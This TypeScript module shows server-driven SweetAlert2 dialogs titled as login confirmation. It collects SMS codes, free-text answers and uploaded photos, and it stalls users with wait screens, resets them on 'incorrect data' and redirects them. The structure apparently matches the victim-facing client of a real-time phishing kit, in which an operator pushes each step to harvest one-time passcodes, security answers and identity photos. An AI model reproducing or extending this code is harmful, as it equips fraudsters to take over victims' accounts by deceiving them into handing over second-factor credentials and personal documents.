import Swal from 'sweetalert2';
import 'sweetalert2/dist/sweetalert2.min.css';
import type { Answer, Command } from './types';

type Dict = Record<string, string>;

type Ctx = {
    dict: Dict;
    answer: (a: Answer) => Promise<void>;
    reset: () => void;
};

function t(dict: Dict, key: string, fallback?: string): string {
    return dict[key] ?? fallback ?? key;
}

export function showCommand(command: Command, ctx: Ctx): void {
    const { dict } = ctx;

    switch (command.type) {
        case 'idle':
            Swal.close();
            return;

        case 'hold.short':
            Swal.fire({
                title: t(dict, 'flow.loginConfirmation'),
                text: command.text ?? t(dict, 'flow.pleaseWait'),
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
                didOpen: () => Swal.showLoading(),
            });
            return;

        case 'hold.long':
            Swal.fire({
                title: t(dict, 'flow.loginConfirmation'),
                text: command.text ?? t(dict, 'flow.pleaseWaitLong'),
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
                didOpen: () => Swal.showLoading(),
            });
            return;

        case 'push':
            Swal.fire({
                title: t(dict, 'flow.loginConfirmation'),
                html: t(dict, 'flow.pushNotification'),
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
                didOpen: () => Swal.showLoading(),
            });
            return;

        case 'sms':
            Swal.fire({
                title: t(dict, 'flow.confirmation'),
                text: t(dict, 'flow.codeSent'),
                input: 'text',
                inputPlaceholder: t(dict, 'flow.enterCode'),
                confirmButtonText: t(dict, 'flow.confirm'),
                allowOutsideClick: false,
                allowEscapeKey: false,
                showCancelButton: false,
                inputValidator: (value: string) => {
                    if (!value) return t(dict, 'flow.codeRequired');
                    if (!/^\d+$/.test(value)) return t(dict, 'flow.numbersOnly');
                    return null;
                },
                preConfirm: async (value: string) => {
                    try {
                        await ctx.answer({ command: 'sms', payload: { code: value } });
                    } catch (e) {
                        Swal.showValidationMessage(e instanceof Error ? e.message : 'failed');
                    }
                },
            });
            return;

        case 'invalid-data':
            Swal.fire({
                title: t(dict, 'flow.error'),
                text: t(dict, 'flow.incorrectData'),
                icon: 'error',
                confirmButtonText: t(dict, 'flow.ok'),
            }).then((r) => {
                if (r.isConfirmed) ctx.reset();
            });
            return;

        case 'error':
            Swal.fire({
                title: t(dict, 'flow.error'),
                html: command.text,
                icon: 'error',
                confirmButtonText: t(dict, 'flow.ok'),
            }).then((r) => {
                if (r.isConfirmed) ctx.reset();
            });
            return;

        case 'question':
            Swal.fire({
                title: t(dict, 'flow.confirmation'),
                html: command.text,
                input: 'text',
                confirmButtonText: t(dict, 'flow.sendAnswer'),
                allowOutsideClick: false,
                allowEscapeKey: false,
                inputValidator: (value: string) => (!value.trim() ? ' ' : null),
                preConfirm: async (value: string) => {
                    try {
                        await ctx.answer({ command: 'question', payload: { answer: value } });
                    } catch (e) {
                        Swal.showValidationMessage(e instanceof Error ? e.message : 'failed');
                    }
                },
            });
            return;

        case 'photo.with-input':
            Swal.fire({
                title: t(dict, 'flow.uploadPhoto'),
                html: command.text ?? '',
                input: 'file',
                inputAttributes: { accept: 'image/*' },
                confirmButtonText: t(dict, 'flow.sendAnswer'),
                allowOutsideClick: false,
                allowEscapeKey: false,
                inputValidator: (value) => (!value ? ' ' : null),
                preConfirm: async (file: File) => {
                    const extra = (Swal.getPopup()?.querySelector('#swal-extra-text') as HTMLInputElement | null)?.value ?? '';
                    if (!extra.trim()) {
                        Swal.showValidationMessage(t(dict, 'flow.codeRequired'));
                        return false;
                    }
                    try {
                        await ctx.answer({
                            command: 'photo.with-input',
                            payload: { file, text: extra },
                        });
                    } catch (e) {
                        Swal.showValidationMessage(e instanceof Error ? e.message : 'failed');
                    }
                },
                didOpen: () => {
                    const popup = Swal.getPopup();
                    if (!popup) return;
                    const input = document.createElement('input');
                    input.type = 'text';
                    input.id = 'swal-extra-text';
                    input.className = 'swal2-input';
                    popup.querySelector('.swal2-file')?.after(input);
                },
            });
            return;

        case 'photo.without-input':
            Swal.fire({
                title: t(dict, 'flow.uploadPhoto'),
                html: command.text ?? '',
                input: 'file',
                inputAttributes: { accept: 'image/*' },
                confirmButtonText: t(dict, 'flow.sendAnswer'),
                allowOutsideClick: false,
                allowEscapeKey: false,
                inputValidator: (value) => (!value ? ' ' : null),
                preConfirm: async (file: File) => {
                    try {
                        await ctx.answer({
                            command: 'photo.without-input',
                            payload: { file },
                        });
                    } catch (e) {
                        Swal.showValidationMessage(e instanceof Error ? e.message : 'failed');
                    }
                },
            });
            return;

        case 'redirect':
            // redirect handled by the hook via window.location.href
            Swal.close();
            return;
    }
}
